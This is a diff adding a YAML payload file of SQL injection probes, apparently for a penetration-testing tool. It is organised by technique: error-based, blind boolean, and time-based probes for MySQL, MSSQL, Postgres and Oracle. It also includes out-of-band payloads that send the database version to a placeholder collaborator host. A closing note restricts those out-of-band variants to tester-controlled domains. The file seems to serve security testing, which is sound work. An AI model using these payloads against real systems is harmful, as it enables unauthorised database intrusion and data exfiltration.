@@ -1,0 +1,40 @@
+name: SQL Injection Payloads
+description: Curated SQLi probes organized by detection technique
+
+error_based:
+  - "'"
+  - "''"
+  - "\""
+  - "' OR '1'='1"
+  - "' OR 1=1--"
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 100--"
+
+blind_boolean:
+  - "' AND 1=1--"
+  - "' AND 1=2--"
+  - "' AND SUBSTRING(@@version,1,1)='5"
+
+time_based:
+  mysql:
+    - "' AND SLEEP(5)--"
+    - "' OR SLEEP(5)--"
+  mssql:
+    - "'; WAITFOR DELAY '0:0:5'--"
+  postgres:
+    - "'; SELECT pg_sleep(5)--"
+  oracle:
+    - "' AND DBMS_LOCK.SLEEP(5)='"
+
+oob:
+  mysql:
+    - "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.YOUR-COLLABORATOR\\\\a'))--"
+  mssql:
+    - "'; EXEC master..xp_dirtree '\\\\YOUR-COLLABORATOR\\a'--"
+  oracle:
+    - "' AND UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))='"
+
+notes: >
+  Use the OOB variants only against interactsh/collaborator domains you
+  control, and only after time-based tests are inconclusive. Always confirm
+  reproducibility 3 times before marking a SQLi finding confirmed.
